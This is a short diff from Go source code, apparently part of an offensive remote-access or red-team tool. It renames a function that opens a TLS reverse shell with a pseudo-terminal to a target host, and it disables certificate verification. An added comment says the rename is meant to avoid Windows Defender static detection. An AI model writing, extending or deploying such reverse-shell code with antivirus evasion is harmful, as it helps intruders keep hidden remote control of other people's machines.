@@ -46,8 +46,9 @@ func DetectDefaultShell() (shell string) {
 	return shell
 }
 
-//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
-func ReverseShell(host string, shell string) {
+//ShellReverse: spawn a reverse shell with pty targeting host (ip:port).
+// (Name is ShellReverse cause ReverseShell does not pass windows defender static analysis)
+func ShellReverse(host string, shell string) {
 	logger.AddFilenameAndLinePrefix(log.Default())
 	conf := &tls.Config{
 		InsecureSkipVerify: true,
